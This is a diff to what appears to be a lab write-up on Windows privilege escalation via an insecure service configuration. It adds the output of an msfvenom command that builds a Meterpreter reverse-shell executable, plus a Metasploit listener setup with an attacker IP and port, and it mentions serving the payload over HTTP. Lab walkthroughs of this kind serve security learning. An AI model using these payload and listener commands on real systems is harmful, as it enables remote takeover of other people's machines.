@@ -93,3 +93,39 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -
 - `-f exe`: Generates the payload as a Windows executable (.exe).
 - `-o reverse.exe`: Saves the generated payload as reverse.exe.
 
+**Output:**
+
+```text
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7680 bytes
+Saved as: reverse.exe
+```
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step1-1.png" width="600">
+</p>
+
+## Step 2 — Setting Up Metasploit Listener and HTTP Server
+
+I opened two terminals on Kali — one for the Metasploit listener and one to host the payload over HTTP.
+
+Terminal 1 — Metasploit Listener
+
+```bash
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 192.168.5.128
+set lport 4444
+run
+```
+**Output:**
+
+```text
+[*] Started reverse TCP handler on 192.168.5.128:4444
+```
+<p align="center">
+  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step2-1.png" width="600">
+</p>
